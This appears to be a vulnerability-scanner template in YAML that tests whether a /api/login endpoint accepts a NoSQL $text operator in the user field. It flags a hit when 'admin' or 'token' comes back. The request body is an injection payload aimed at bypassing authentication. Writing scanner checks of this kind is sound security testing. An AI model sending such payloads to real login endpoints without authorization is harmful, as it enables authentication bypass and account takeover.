id: nosql2-238
name: 'NoSQL $text in user'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $text accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"user":{"$text":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
